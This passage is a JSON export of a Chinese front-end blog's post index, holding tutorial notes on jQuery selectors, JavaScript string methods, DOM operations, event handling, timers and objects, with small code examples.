查找兄弟元素siblings()查找当前元素的兄弟","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"jQuery概述（一）","slug":"2016-08-jQuery概述及学习纲要（一）","date":"2016-08-07T11:35:08.000Z","updated":"2018-10-24T03:46:01.863Z","comments":true,"path":"note/11a06214.html","link":"","permalink":"https://ru23.com/note/11a06214.html","excerpt":"jQuery是什么: 是一个javascript代码仓库，我们称之为javascript框架。 是一个快速的简洁的javascript框架，可以简化查询DOM对象、处理事件、制作动画、处理Ajax交互过程。","text":"jQuery是什么: 是一个javascript代码仓库，我们称之为javascript框架。 是一个快速的简洁的javascript框架，可以简化查询DOM对象、处理事件、制作动画、处理Ajax交互过程。 jQuery可以帮我们做什么(有什么优势)、 体积小，使用灵巧(只需引入一个js文件) 方便的选择页面元素(模仿CSS选择器更精确、灵活) 动态更改页面样式/页面内容(操作DOM，动态添加、移除样式) 控制响应事件(动态添加响应事件) 提供基本网页特效(提供已封装的网页特效方法) 快速实现通信(ajax) 易扩展、插件丰富 javascript用来干什么的： 操作DOM对象 动态操作样式css 数据访问 控制响应事件等 讲解$(function(){}) $是jQuery别名。如$()也可jQuery()这样写,相当于页面初始化函数，当页面加载完毕，会执行jQuery()。 希望在做所有事情之前，JQuery操作DOM文档。必须确保在DOM载入完毕后开始执行，应该用ready事件做处理HTML文档的开始。 $(document).ready(function(){}) 类似于js的window.onload事件函数，但是ready事件要先于onload事件执行。 window.onload = function(){} 为方便开发，jQuery简化这样的方法，直接用$()表示 JQuery的ready事件不等于Js的load ： 执行时机不同：load需要等外部图片和视频等全部加载才执行。ready是DOM绘制完毕后执行，先与外部文件。 用法不同：load只可写一次，ready可以多次。 $()和document是相等的吗 12345&lt;div id=\"a\" class=\"aa\"&gt;&lt;/div&gt;&lt;div id=\"b\" class=\"aa\"&gt;&lt;/div&gt;&lt;div id=\"c\" class=\"aa\"&gt;&lt;/div&gt;alert(document.getElementById(\"id\") == $(\"#aa\"));//返回结果为falsealert(document.getElementById(\"id\") == $(\"#aa\").get(0));//返回true 样式选择器$(&quot;.className&quot;) $(&quot;.aa&quot;).css(&quot;color&quot;,&quot;green&quot;) id选择器 $(&quot;#a&quot;).css(&quot;background-color&quot;,&quot;#ff0066&quot;) 标签选择器 $(&quot;p&quot;).css(&quot;color&quot;,&quot;#cc3366&quot;) 组选择器 $(&quot;#b ul li&quot;).size(); jQuery有哪些功能(API)： a.选择器 b.过滤器 c.事件 d.效果 e.ajax 简单的JQuery选择器： JQuery基本选择器（ID选择器，标签选择器，类选择器，通配选择器和组选择器5种） ID选择器：document.getElementById(id)与$(&quot;#id&quot;)对比(改变文字大小)—id唯一，返回单个元素 标签选择器：document.getElementsByTagName(tagName)与$(&quot;tagname&quot;)对比—多个标签，返回数组 类选择器:$(&quot;.className&quot;)–多个classname（改变背景图片） 通配选择器：document.getElementsByTagName(&quot;*&quot;)与$(&quot;*&quot;)对比—指范围内的所有标签元素 组选择器：$(&quot;seletor1,seletor2,seletor3&quot;)—-无数量限制，用逗号分割。 附录： 简易jQuery内存图 jQuery学习大纲","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"javascript 下常用的字符串操作","slug":"2016-08-javascript-下常用的字符串操作","date":"2016-08-02T09:35:08.000Z","updated":"2018-10-24T03:46:01.851Z","comments":true,"path":"note/93fe111f.html","link":"","permalink":"https://ru23.com/note/93fe111f.html","excerpt":"charAt() 返回在指定位置的字符。","text":"charAt() 返回在指定位置的字符。 12var str = \"abac_dfra_wa\";console.log(str.charAt(3)); //输出 c charCodeAt() 返回在指定的位置的字符的 Unicode 编码。12var str = \"abac_dfra_wa\";console.log(str.charCodeAt(3)); //输出99 fromCharCode() 从字符编码创建一个字符串1console.log(String.fromCharCode(72,69,76,76,79)); //输出HELLO concat() 连接字符串12var str = \"abac_dfra_wa\";console.log(str.concat('_000')); //输出abac_dfra_wa_000 indexOf() 检索字符串12var str = \"abac_dfra_wa\"; console.log(str.indexOf('ac')); //输出2 lastIndexOf() 从后向前搜索字符串。12var str = \"abac_dfra_wa\";console.log(str.lastIndexOf('ac')); //输出2 match() 找到一个或多个正则表达式的匹配1234var str=\"1 plus 2 equal 3\"console.log(str.match('plus')); // plusconsole.log(str.match('st')); // nullconsole.log(str.match(/\\d+/g)) // [ '1', '2', '3' ] replace() 替换与正则表达式匹配的子串123456789101112var str=\"Hello WoRlD!\"console.log(str.replace(/WoRlD/, \"World\")); // Hello World!var str=\"Hello WoRlD! \"str += str;console.log(str.replace(/WoRlD/g, \"World\")); //替换所有, 输出：Hello World! Hello World! var str = \"javascript Tutorial \";console.log(str.replace(/javascript/i, \"JavaScript\")); //确保匹配字符串大写字符的正确var name = \"Doe, John\";console.log(name.replace(/(\\w+)\\s*, \\s*(\\w+)/, \"$2 $1\")); //将把 \"Doe, John\" 转换为 \"John Doe\" 的形式 search() 检索与正则表达式相匹配的值(大小写敏感)，未找到输出-1。12345var str=\"Hello World!\"console.log(str.search(/World/)); //输出6var str=\"Hello World!\"console.log(str.search(/world/i)); //忽略大小写的检索，输出6 slice() 提取字符串的片断，并在新的字符串中返回被提取的部分123var str=\"Hello happy world!\"console.log(str.slice(6)); //输出happy world!console.log(str.slice(6, 11)); //输出happy split() 把字符串分割为字符串数组12345\"|a|b|c\".split(\"|\") ////将返回[\"\", \"a\", \"b\", \"c\"]\"How are you doing today?\".split(\" \",3) //返回 How,are,you\"hello\".split(\"\") //可返回 [\"h\", \"e\", \"l\", \"l\", \"o\"]","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"Snippet","slug":"Snippet","permalink":"https://ru23.com/tags/Snippet/"}]},{"title":"JavaScript中property和attribute的区别","slug":"2016-07-JavaScript中property和attribute的区别","date":"2016-07-27T05:50:20.000Z","updated":"2018-10-24T03:46:01.709Z","comments":true,"path":"note/cbc703ee.html","link":"","permalink":"https://ru23.com/note/cbc703ee.html","excerpt":"1. 定义 property（元素属性）：DOM 节点是一个对象，因此，可以添加自定义的属性以及方法。property 的值可以是任何的数据类型，对大小写敏感。自定义的property不会出现在 html 中，只存在 JavaSctipt 中。 attribute（标签属性）：attribute 只能是字符串，大小写不敏感，出现在 innerHTML 中，通过类数组attributes可以罗列所有的 attribute。 2. 相同之处","text":"1. 定义 property（元素属性）：DOM 节点是一个对象，因此，可以添加自定义的属性以及方法。property 的值可以是任何的数据类型，对大小写敏感。自定义的property不会出现在 html 中，只存在 JavaSctipt 中。 attribute（标签属性）：attribute 只能是字符串，大小写不敏感，出现在 innerHTML 中，通过类数组attributes可以罗列所有的 attribute。 2. 相同之处 标准 DOM 的 properties（元素属性）与attributes（标签属性）是同步的。公认的 attributes（标签属性）会添加到DOM对象 property（元素属性）上，如 id、style、className、disabled、checked等。这时候直接操作 property (el. checked) 或者使用 el.getAttribute() / el.setAttribute()效果一致。但是参数不一定相同，如：el.className 与 el.getAttribute(&#39;class&#39;) 3. 不同之处 对于有些标准的特性的操作，el.getAttribute 与 el.property获取的值存在差异性。如: `href、src、value、style、onclic 等 Demo1：el.getAttribute 获取的是 href 的实际值，el.property 获取的是完整的 url 123alEl.href = '/';alert(alEl.getAttribute('href')); // '/'alert(alEl.href); // full URL Demo2：el.property 可以从 el.setAttribute 获得同步 12inputEl.setAttribute('value', 'hello');alert(inputEl.value ); // 'hello' -- property changed! Demo3： el.getAttribute 不能从 el.property 获得同步 12inputEl.value = 'bye';alert(inputEl.getAttribute('value')); // 'hello' – attribute not changed! Demo4：el.getAttribute 只能获取输入框的原始值，el.property 可以获取输入框修改后值 用户输入 ‘good’，inputEl.value 获得 ‘good’，inputEl.getAttribute(‘value’) 获得原始值 ‘hello’。可以利用 inputEl.value == inputEl.getAttribute(‘value’) 检验 input 是否变化 Demo5：checkbox 未选中时 – el.getAttribute 返回 null，el.property 返回 false checkbox 选中时 – el.getAttribute 仍返回 null，el.property 返回 ture12alert(checkboxEl.checked); // boolean truealert(checkboxEl.getAttribute('checked')); // object null Demo6：style – el.getAttribute 返回 string, el.property 返回 object 12alert(divEl.style); // 'width:200px;height:200px;'alert(divEl.getAttribute('style') ) // [object CSSStyleDeclaration] 4. 浏览器兼容性上的差别 1)IE&lt;9 浏览器中，el.property 和 el.getAttribute 可以相互访问自定义属性 2)IE&lt;8（包括IE8种的IE7兼容模式），el.property 和 el.getAttribute 相同 因为 attribute 对大小写不敏感，在这种情况下，用 el.getAttribute 访问特性时，浏览器会选择第一次出现的值。 1234document.body.abba = 1 // assign property (now can read it by getAttribute)document.body.ABBA = 5 // assign property with another case// must get a property named 'ABba' in case-insensitive way.alert( document.body.getAttribute('ABba') ) // 1 5. 优先选择 property 在实际应用中，98% 的 DOM 操作都是使用 properties。 总结：只有两种情形需要使用attributes ： 1) 自定义的 HTML attributes，因为它并不同步到DOM property 2) 访问内置的HTML attributes（设置的初始值），这些 attribute不能从property 同步过来。例如input标签的 value 值","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"jQuery与原生JS的DOM操作对比","slug":"2016-07-jQuery与原生JS的DOM操作对比","date":"2016-07-27T05:50:20.000Z","updated":"2018-10-24T03:46:01.791Z","comments":true,"path":"note/99d7d7a9.html","link":"","permalink":"https://ru23.com/note/99d7d7a9.html","excerpt":"1. 创建元素节点 原生JS创建元素节点: document.createElement(&quot;p&quot;); jQuery创建元素节点：$(&#39;&lt;p&gt;&lt;/p&gt;&#39;);","text":"1. 创建元素节点 原生JS创建元素节点: document.createElement(&quot;p&quot;); jQuery创建元素节点：$(&#39;&lt;p&gt;&lt;/p&gt;&#39;); 2. 创建并添加文本节点: 原生JS创建文本节点：document.createTextNode(&quot;Text Content&quot;); 通常创建文本节点和创建元素节点配合使用，比如： 123var textEl = document.createTextNode(\"Hello World.\");var pEl = document.createElement(\"p\");pEl.appendChild(textEl); jQuery创建并添加文本节点：var $p = $(&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;); 3. 复制节点 原生JS复制节点: var newEl = pEl.cloneNode(true); true和false的区别： true ：克隆整个&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;节点 false：只克隆&#39;&lt;p&gt;&lt;/p&gt;&#39;，不克隆文本&#39;Hello World.&#39; jQuery复制节点：$newEl = $(&#39;#pEl&#39;).clone(true); 注意：克隆节点要避免ID重复 4. 插入节点 原生JS向子节点列表的末尾添加新的子节点：El.appendChild(newNode); 原生JS在节点的已有子节点之前插入一个新的子节点：El.insertBefore(newNode, targetNode); 在jQuery中，插入节点的方法比原生JS多的多： $(&#39;#El&#39;).append(&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;); 在匹配元素子节点列表结尾添加内容 $(&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;).appendTo(&#39;#El&#39;); 把匹配元素添加到目标元素子节点列表结尾 $(&#39;#El&#39;).prepend(&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;); 在匹配元素子节点列表开头添加内容 $(&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;).prependTo(&#39;#El&#39;); 把匹配元素添加到目标元素子节点列表开头 $(&#39;#El&#39;).before(&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;); 在匹配元素之前添加目标内容 $(&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;).insertBefore(&#39;#El&#39;); 把匹配元素添加到目标元素之前 $(&#39;#El&#39;).after(&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;); 在匹配元素之后添加目标内容 $(&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;).insertAfter(&#39;#El&#39;); 把匹配元素添加到目标元素之后 5. 删除节点 原生JS删除节点: El.parentNode.removeChild(El); jQuery删除节点:$(&#39;#El&#39;).remove(); 6. 替换节点 原生JS替换节点: El.repalceChild(newNode, oldNode);注意：oldNode必须是parentEl真实存在的一个子节点 jQuery替换节点:$(&#39;p&#39;).replaceWith(&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;); 7. 设置属性/获取属性 原生JS设置属性/获取属性: imgEl.setAttribute(&quot;title&quot;, &quot;logo&quot;); imgEl.getAttribute(&quot;title&quot;); checkboxEl.checked = true; checkboxEl.checked; jQuery设置属性/获取属性: -$(&quot;#logo&quot;).attr({&quot;title&quot;: &quot;logo&quot;}); $(&quot;#logo&quot;).attr(&quot;title&quot;); $(&quot;#checkbox&quot;).prop({&quot;checked&quot;: true}); $(&quot;#checkbox&quot;).prop(&quot;checked&quot;);","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"JavaScript之事件的中断传播与行为阻止","slug":"2016-07-JavaScript之事件的中断传播与行为阻止","date":"2016-07-27T03:50:43.000Z","updated":"2018-10-24T03:46:01.715Z","comments":true,"path":"note/45243f7e.html","link":"","permalink":"https://ru23.com/note/45243f7e.html","excerpt":"如何中断事件的传播？ stopPropagation() w3c取消冒泡 cancleBubble = true IE取消冒泡","text":"如何中断事件的传播？ stopPropagation() w3c取消冒泡 cancleBubble = true IE取消冒泡 取消事件默认效果： returnValue = false IE 取消事件效果 defaultPrevent() w3c取消事件效果 12345&lt;div id='aa'&gt; &lt;div id='bb'&gt; &lt;div id ='cc'&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456789101112131415 #aa&#123; width: 600px; height: 600px; background: gray;&#125;#bb&#123; width: 400px; height: 400px; background: green;&#125;#cc&#123; width: 200px; height: 200px; background: red;&#125; 捕捉写法停止传播 从最顶层开始往下 123document.getElementById('aa').addEventListener('click',function (ev)&#123;alert('aa');ev.stopPropagation();&#125;,true);// 结果捕捉到aa 加true 由冒泡变为捕捉 从上到下 document.getElementById('bb').addEventListener('click',function ()&#123;alert('bb')&#125;,true); document.getElementById('cc').addEventListener('click',function ()&#123;alert('cc')&#125;,true); 冒泡写法停止传播 从下往上 123456789document.getElementById('aa').addEventListener('click',function ()&#123;alert('aa');&#125;);//加true 由冒泡变为捕捉 从上到下 document.getElementById('bb').addEventListener('click',function ()&#123;alert('bb')&#125;); document.getElementById('cc').addEventListener('click', function (ev)&#123; alert('cc'); ev.stopPropagation(); // ev.cancleBubble = true;//IE下 取消冒泡方法 &#125;); //结果是冒出cc 停止传播&#125; 取消事件效果 returnValue = false //IE 取消事件效果 preventDefault() //w3c取消事件效果 12345678document.getElementsByTagName('a')[0].onclick = function (ev)&#123; alert('点击'); //达到事件结束的效果 但是函数还是往下运行 // ev.preventDefault(); alert('已经拦截');&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript之IE,火狐兼容事件对象","slug":"2016-07-JavaScript之IE-火狐兼容事件对象","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T03:46:01.714Z","comments":true,"path":"note/41b2f700.html","link":"","permalink":"https://ru23.com/note/41b2f700.html","excerpt":"1234567document.getElementById('par').addEventListener ('click',function (ev)&#123; ev = ev||window.event;// 在IE下ev为null window.event为真 || &amp;&amp;在php和js中不同 在js中 第一个真 就返回 否则返回第二个 alert(ev.screenX+ev.screenY)&#125; ); document.getElementById('son').addEventListener ('click',function ()&#123;alert('son')&#125;);","text":"1234567document.getElementById('par').addEventListener ('click',function (ev)&#123; ev = ev||window.event;// 在IE下ev为null window.event为真 || &amp;&amp;在php和js中不同 在js中 第一个真 就返回 否则返回第二个 alert(ev.screenX+ev.screenY)&#125; ); document.getElementById('son').addEventListener ('click',function ()&#123;alert('son')&#125;); 在js方法和属性没区别 方法和函数都是变量 1234567891011121314151617var par = document.getElementById('par'); if (par.attachEvent)&#123; par.attachEvent('onclick',function (ev)&#123; ev = ev||window.event;// 在IE下ev为null window.event为真 || &amp;&amp;在php和js中不同 在js中 第一个真 就返回 否则返回第二个 alert(ev.screenX+'--'+ev.screenY)&#125; ); &#125;else&#123; par.addEventListener('click',function (ev)&#123; ev = ev||window.event;// 在IE下ev为null window.event为真 || &amp;&amp;在php和js中不同 在js中 第一个真 就返回 否则返回第二个 alert(ev.screenX+'--'+ev.screenY)&#125; ); 下面方法更加简洁 123456789101112131415//document.getElementById('son').addEventListener ('click',function ()&#123;alert('son')&#125;); var par = document.getElementById('par'); var prefix = ''; if (par.attachEvent)&#123;//如果是IE par.addEventListener = par.attachEvent; prefix = 'on'; //讨论IE 火狐的onclick click &#125; par.addEventListener('click',function (ev)&#123;//火狐下 ev = ev||window.event; alert(ev.screenX+'--'+ev.screenY)&#125; );","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript中三种绑定事件的方式与去除绑定","slug":"2016-07-JavaScript中三种绑定事件的方式与去除绑定","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T03:46:01.711Z","comments":true,"path":"note/e23a0171.html","link":"","permalink":"https://ru23.com/note/e23a0171.html","excerpt":"绑定事件的第1种办法： 函数写在结构层里面 非常不好，使页面很混乱，行为与结构得不到分离","text":"绑定事件的第1种办法： 函数写在结构层里面 非常不好，使页面很混乱，行为与结构得不到分离 1&lt;input type=\"button\" onclick=\"func();\"&gt; 绑定事件的第2种办法 好处：行为与结构开始分离 缺点： 第二种绑定方式中 只能给一个时间绑定一个处理函数 即.onclick = fn1;.onclick = fn2 最终的效果是onclick = fn2 1234567891011121314&lt;select name=\"xueli\" &gt; &lt;option value=\"\"&gt;请选择学历&lt;/option&gt; &lt;option value=\"大学\" &gt;大学&lt;/option&gt; &lt;option value=\"中学\"&gt;中学&lt;/option&gt; &lt;option value=\"初中\"&gt;初中&lt;/option&gt; &lt;option value=\"小学\"&gt;小学&lt;/option&gt; &lt;/select&gt;&lt;form action=\"\"&gt; &lt;p&gt;Email:&lt;input type=\"text\" name=\"email\"&gt; 姓名：&lt;input type=\"text\" name=\"ming\" &gt; &lt;/p&gt;&lt;/form&gt; 12345678910document.getElementsByTagName('select')[0].onclick= function ()&#123; alert('嘻嘻'); &#125;document.getElementsByName('email')[0].onblur=function ()&#123; alert('哈哈哈');&#125; 123456789101112window.onload = function()&#123; var d = document.getElementById('school'); function fn1()&#123; alert('hello'); &#125; function fn2()&#123; alert('world'); &#125; d.onclick = fn1;//赋值操作 最终显示fn2 d.onclick = fn2;&#125; 绑定事件的第3种办法 1234567891011121314151617181920//错误写法1window.onload = function()&#123; var d = document.getElementById('school'); function fn1()&#123;//this此时指向window this.style.background = 'blue'; &#125; function fn2()&#123;//this此时指向window this.style.background = 'red'; &#125; //写一个匿名函数 //最终的出现错误 d.onclick = function ()&#123; fn1(); fn2(); //fn1 fn2是属性window的 实际上是这样 window.fn1() window.fn2() &#125;&#125; 下面这种写法没有问题 但是给DOM树额外增加了两个变量123456789101112131415161718window.onload = function()&#123; var d = document.getElementById('school'); d.fn1 = function ()&#123;//fn1是d的属性 最终this此时指向DOM对象 this.style.background = 'blue'; &#125; d.fn2 = function ()&#123;//this此时指向DOM对象 this.style.background = 'red'; &#125; //匿名函数 调用上面两个函数 d.onclick = function ()&#123; this.fn1(); this.fn2(); &#125;&#125; 不在使用onclick 12345678window.onload = function()&#123; var d = document.getElementById('school'); //达到了一次绑定两个函数 d.addEventListener('click',function () &#123;alert('blue');this.style.background ='blue'&#125;); d.addEventListener('click',function () &#123;alert('red');this.style.background ='red'&#125;); &#125; 去除绑定 不能用匿名函数 匿名函数 当时产生 当时消失 123456789101112131415161718var fn1 = function () &#123;alert('blue');this.style.background ='blue'&#125;;var fn2 = function () &#123;alert('red');this.style.background ='red'&#125;; function adde()&#123; var d = document.getElementById('school'); d.addEventListener('click',fn1); d.addEventListener('click',fn2); &#125;function reme()&#123; var d = document.getElementById('school'); //d.removeEventListener('click',fn1);//只剩fn1 d.removeEventListener('click',fn2);&#125; 在IE下第三种绑定事件的方法 12345&lt;div id=\"school\"&gt; &lt;/div&gt; &lt;input type=\"button\" value=\"加事件\" onclick=\"adde();\"&gt; &lt;input type=\"button\" value=\"减事件\" onclick=\"reme();\"&gt; 12345678910111213141516171819var fn1 = function () &#123;alert('blue');this.style.background ='blue'&#125;;var fn2 = function () &#123;alert('red');this.style.background ='red'&#125;; function adde()&#123; var d = document.getElementById('school'); // IE6,7是后绑定的事件先发生 d.attachEvent('onclick',fn1); d.attachEvent('onclick',fn2); //fn2先发生 &#125;function reme()&#123; var d = document.getElementById('school'); //d.deltachEvent('click',fn1);//只剩fn1 d.deltachEvent('click',fn2);&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript之定时器","slug":"2016-07-JavaScript之定时器","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T03:46:01.719Z","comments":true,"path":"note/e59c5ebc.html","link":"","permalink":"https://ru23.com/note/e59c5ebc.html","excerpt":"window定时器 setIntval(表达式,毫秒) clearIntval(定时器对象) setTimeout(表达式,毫秒) clearTimeout(定时器对象)","text":"window定时器 setIntval(表达式,毫秒) clearIntval(定时器对象) setTimeout(表达式,毫秒) clearTimeout(定时器对象) setTimeout(表达式,毫秒)：是指经过指定时间后执行事件一次 清除定时器： 在创建定时器的时候 把创建的结果赋给一个定时器变量 比如：var clock = windows.setTimeout()再用cleraTimeout(clock); 12345678910//定一段时间后执行某一个函数 function t()&#123; window.location.href = 'http:///www.baidu.com'; &#125; window.setTimeout('t()',10*1000);//setTimeout只是执行一次 //用setTimeout来实现每隔5秒执行某一个一次 放到函数里面可以做到 setTimeout实现每隔几秒执行一下 123456789function t()&#123; // window.location.href = 'http:///www.baidu.com';window.setTimeout('t()',2*1000);&#125;t(); setIntval每隔指定时间执行一次事件 碰到每隔几秒执行一次事件的 推荐用setInterval 12345678910function t()&#123; alert('2秒到');&#125;var clock = window.setInterval('t()',2000);//clock命名为了后面消除定时器用到 这个变量是指向定时器function t1()&#123; clearInterval(clock);&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript之面向对象中的静态方法-静态属性","slug":"2016-07-JavaScript之面向对象中的静态方法-静态属性","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T09:44:20.584Z","comments":true,"path":"note/ad8e4831.html","link":"","permalink":"https://ru23.com/note/ad8e4831.html","excerpt":"面向对象中的静态方法-静态属性：没有new对象 也能引用静态方法属性","text":"面向对象中的静态方法-静态属性：没有new对象 也能引用静态方法属性 12345678910function Bird()&#123; this.wing = 2; this.fly = function()&#123; alert('飞'); &#125; &#125;// var maque = new Bird();//我们可以调用麻雀的属性和方法 思考：可不可以不创建麻雀对象 直接调用Bird的相关方法 函数是什么？是变量 是什么类型的变量？是一个对象类型的变量 js里面有几样东西不通过构造器构造出来 原生数据类型有几种：null undefined true false 字符型(‘hello’) 数值型(12) 这五种不用构造器 对象 函数 数组 都是通过构造器构造出来的（自然是对象） 既然是对象 就能给对象加静态属性 1234Bird.ke = 'niaoke';Bird.jiao = function()&#123;alert('叽叽喳喳')&#125;;Bird.jiao();//没有new对象 也能引用静态方法属性 从豆浆机–&gt;制造的流程看 豆浆机充当的是构造函数的角色，如果单独看豆浆机本身 豆浆机也是一部机器 一个对象 也有属性和方法 那么 豆浆机作为对象的属性和方法 就相当于类的静态属性、静态方法","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript对象","slug":"2016-07-JavaScript对象","date":"2016-07-27T03:40:43.000Z","updated":"2018-10-24T09:44:25.861Z","comments":true,"path":"note/17d9136e.html","link":"","permalink":"https://ru23.com/note/17d9136e.html","excerpt":"创建对象","text":"创建对象 对象的概念： 对象和数组的本质一样 都是组织一堆数据 只不过 对象的下表不为数字而且无序 每个编号–&gt;内容 属性–&gt;值 对象和数组的本质一样 都是组织一堆数据 只不过 对象的下表不为数字而且无序 创建对象：（不仅给值 还给属性） 创建对象和数组的[]不一样 和创建对象用{} 和创建数组直接放置的值不一样 创建对象时值前面还要加上属性 创建语法:{属性1:值1,属性2:值2} 对象单元值的引用：（两种方法） Obj.属性 Obj[&#39;属性&#39;] 12345678var stu = &#123;name:'小明',age:22,number:007,score:99&#125;;// alert(stu);//这种方法不推荐//alert(stu['name']);// name需要加上单引号 不然就和变量一样了//推荐用法alert(stu.score); 对象的遍历 遍历对象： 因为对象的属性和数组的下标不一样 数组的下表从0开始并且有规律的递增 因此可以用for循环遍历 对象的属性 没有规律的 for in结构来遍历123For(per in Obj)&#123; ......&#125; 注意：在for in结构中循环得到的属性取值时不能用Obj.属性的方式 只能用中括号 对象和数组本质一个键值对 1234567var stu = &#123;name:'小明',age:22,number:007,score:99&#125;;//注意：在for in 结构中循环得到的属性取值时不能用Obj.属性的方式 只能用obj[属性] for(var i in stu)&#123;//把stu里面的所有属性依次赋给i遍历输出 document.write(stu[i]+'&lt;br&gt;');//stu['i'] 不能这样写 stu['name'] 必须加上单引号 否则系统理解为name是变量 name是属性 是一个字符 &#125; 对象的单元删除 对象的单元删除:对象单元的删除delete obj.属性 1234567891011var stu = &#123;name:'小明',age:22,number:007,score:99&#125;; for(var i in stu)&#123; document.write(stu[i]+'&lt;br&gt;'); &#125; document.write('&lt;hr&gt;'); delete stu.score; for(var i in stu)&#123; document.write(stu[i]+'&lt;br&gt;'); &#125; 对象的方法 在js中 函数本身就是变量 而在数组和对象中存储的就是‘变量’ 对象的某个属性的值–没有可能是一个哈函数？也是可以的 对象的某个属性对象的值可以是函数，如果是函数时，这个属性叫做方法 如果对象的某个方法（属性），需要调用自身的某个属性值，可以在函数中用一个关键词this来代替自己这个对象 this–&gt;指向当前正在调用这个方法的对象（对象自身） 1234//写法1var stu = &#123;name:'张三',age:20,talk:function ()&#123;alert('哈哈哈');&#125;&#125;;// alert(stu.talk);stu.talk();//调用这个函数 1234567891011121314//写法2var zhang = &#123;name:'张三',age:20,talk:null&#125;;var lisi = &#123;name:'李四',age:22,talk:null&#125;;function t(pname)&#123; alert('你好'+pname);&#125;zhang.talk = t;zhang.talk(zhang.name);lisi.talk = t;lisi.talk(lisi.name); 123456789101112131415//写法3 推荐var zhang = &#123;name:'张三',age:20,talk:null&#125;;var lisi = &#123;name:'李四',age:22,talk:null&#125;;function t()&#123; alert('你好'+this.name);//this指向当前正在调用这个方法的对象&#125;zhang.talk = t;zhang.talk();lisi.talk = t;lisi.talk(); JavaScript内置对象: 在js中 所有的变量 都可以被js引擎包装秤对象来处理 比如：str=&#39;abd&#39;字符串本身没有length属性 但是你去调用str.length 在调用一瞬间js引擎会把它包装成一下 当做对象来处理 并且给这个赋了一些方法 对于字符串 布尔值 数值类型 数组 null这些变量 虽然没有属性 但是在调用的前一瞬间 js会为他们包装一些属性和方法 还有一些内置对象，是通过new得来的 比如：日期时间对象 先new 在调用方法和属性 Math对象 和字符串一样 不用new也能直接其方法 字符串对象的属性和方法： length属性： 长度 concat方法：连接两个或者更多个字符串 indexOf（String）返回出现字符串的位置 找不到就返回-1 substr(num1,[num2])//截取字符串 num2截取的宽度 toUpperCase()转换成大写 toLowerCase()转换成小写 replace(oldstr1,newstr2)//字符串替换 123456789101112var str = 'helloworld';//这是一个字符串变量 // alert(str.length); alert(str.concat('中国'));//concat方法：连接两个或者更多个字符串 alert(str.indexOf('o'));//4 alert(str.substr(str.indexOf('o')));//substr截取字符串 一般从开始位置截取 //如有特殊：需要指定截取位置 indexOf（String）返回出现字符串的位置 从当前位置开始截取 alert(str.toUpperCase()); alert(str.replace('hello','连英'));// replace(oldstr1,newstr2) 字符串替换 日期时间对象 日期时间对象 必须通过new 来得到 早数组可以new Array() 造日期时间对象 new Date(); getYear() 返回年份（2位或4位） getFullYear() 返回年份（4位） getMonth()返回月份（0-11） getDate() 返回日期 1-31 getDay() 返回星期数 0-6 getHours()返回小时数0-23 getMinutes()返回分钟数 0-59 getSeconds()返回秒数 0-59 getMilliseconds() 返回毫秒数0-999 12345678910var time = new Date();alert(time.getYear());//116alert(time.getFullYear());//2016alert(time.getMonth());//5alert(time.getDate());//5alert(time.getDay());// 星期天 0alert(time.getHours());//1alert(time.getSeconds());//17alert(time.getMinutes());//20alert(time.getMilliseconds()); 12345678910111213141516//页面上动态时钟function t()&#123; //把年月日 拼接起来 var time = new Date(); var year = time.getFullYear(); var month = time.getMonth(); var day = time.getDate(); var hour = time.getHours(); var minute = time.getMinutes(); var second = time.getSeconds(); document.getElementById('clock').value = (year+\" \"+month+\" \"+day+\" \"+hour+\":\"+minute+\":\"+second); &#125; // document.getElementById('clock').value = t(); //error var clock = setInterval('t()',1000); Math对象 Math对象 和字符串一样 不用new也能直接其方法 ceil(数值)大于或等于该数的最小整数 floor(数值) 小于或等于该数的最大整数 